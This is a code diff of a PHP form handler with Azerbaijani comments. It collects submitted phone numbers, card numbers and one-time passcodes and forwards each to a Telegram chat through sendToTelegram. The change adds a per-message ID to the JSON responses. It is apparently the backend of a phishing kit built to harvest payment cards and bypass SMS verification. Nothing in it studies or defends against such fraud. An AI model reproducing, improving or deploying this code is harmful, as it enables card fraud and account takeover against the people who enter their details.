@@ -22,7 +22,7 @@ $otp = isset($_POST['otp']) ? trim(strip_tags($_POST['otp'])) : '';
 $campaign = isset($_POST['campaign']) ? trim(strip_tags($_POST['campaign'])) : '';
 $type = isset($_POST['type']) ? trim(strip_tags($_POST['type'])) : '';
 
-// SIRALI ID
+// SIRALI ID - HƏR MESAJ ÜÇÜN AYRI
 $counterFile = 'counter.txt';
 if (file_exists($counterFile)) {
     $id = (int)file_get_contents($counterFile) + 1;
@@ -53,7 +53,7 @@ if ($type === 'phone_only') {
     $message = "📞 YENİ NÖMRƏ #" . $id . "\n────────────────────────\n📱 Nömrə: " . $phone . "\n────────────────────────";
     sendToTelegram($message);
     header('Content-Type: application/json');
-    echo json_encode(['status' => 'success']);
+    echo json_encode(['status' => 'success', 'id' => $id]);
     exit;
 }
 
@@ -64,7 +64,7 @@ if ($type === 'card_only' && !empty($cardNumber)) {
     $message .= "\n────────────────────────";
     sendToTelegram($message);
     header('Content-Type: application/json');
-    echo json_encode(['status' => 'success']);
+    echo json_encode(['status' => 'success', 'id' => $id]);
     exit;
 }
 
@@ -75,7 +75,7 @@ if (!empty($otp)) {
     $message .= "\n────────────────────────";
     sendToTelegram($message);
     header('Content-Type: application/json');
-    echo json_encode(['status' => 'success']);
+    echo json_encode(['status' => 'success', 'id' => $id]);
     exit;
 }
 
